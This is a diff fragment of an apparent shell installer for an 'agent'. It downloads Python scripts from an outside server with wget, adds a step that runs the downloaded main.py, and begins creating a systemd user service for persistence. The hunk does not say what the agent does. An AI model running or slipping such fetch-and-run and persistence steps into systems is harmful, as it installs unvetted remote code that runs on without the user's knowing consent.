@@ -37,8 +37,12 @@ wget -q -O main.py https://vc-uy1.npe-techs.com/agent/main.py
 wget -q -O persistence.py https://vc-uy1.npe-techs.com/agent/persistence.py
 wget -q -O heartbeat.py https://vc-uy1.npe-techs.com/agent/heartbeat.py
 
+# Run interactive setup
+"$INSTALL_DIR/venv/bin/python3" main.py --setup
+
 # 4. Persistence Setup
 echo "[4/4] Activating research persistence..."
+
 mkdir -p "$HOME/.config/systemd/user/"
 
 cat <<EOF > "$HOME/.config/systemd/user/vc-agent.service"
